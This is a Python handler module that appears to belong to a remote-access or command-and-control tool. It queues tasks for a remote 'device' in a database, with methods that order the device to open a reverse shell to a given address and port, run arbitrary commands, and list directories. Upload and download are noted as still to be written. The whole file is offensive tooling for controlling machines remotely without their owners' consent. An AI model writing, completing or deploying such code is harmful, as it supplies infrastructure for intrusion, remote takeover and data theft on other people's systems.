from datetime import datetime
from uuid import uuid1

from Database import DeviceModel, Session, TasksModel
from Handlers.base import BaseHandler


class Handler(BaseHandler):
    """The Reverse Http(s) Handler Class to interact with the Device"""

    def __init__(self, db_entry: DeviceModel):
        super().__init__(db_entry)
    
    def alive(self) -> bool:
        delta = (datetime.now() - self.db_entry.last_online).seconds
        if delta < 10:
            return True
        return False 
    
    
    def reverse_shell(self, address: str, port: int, shell: str) -> TasksModel:
        task = self.generate_task()
        task.type = "reverse-shell"
        task.args = [address, port, shell]
        Session.add(task)
        Session.commit()
        return task
    
    def rce(self, cmd: str) -> TasksModel:
        task = self.generate_task()
        task.type = "rce"
        task.args = [cmd]
        Session.add(task)
        Session.commit()
        return task
    
    def get_directory_contents(self, dir: str) -> TasksModel:
        task = self.generate_task()
        task.type = "dir"
        task.args = [dir]
        Session.add(task)
        Session.commit()
        return task
    #TODO: add the other methods upload/download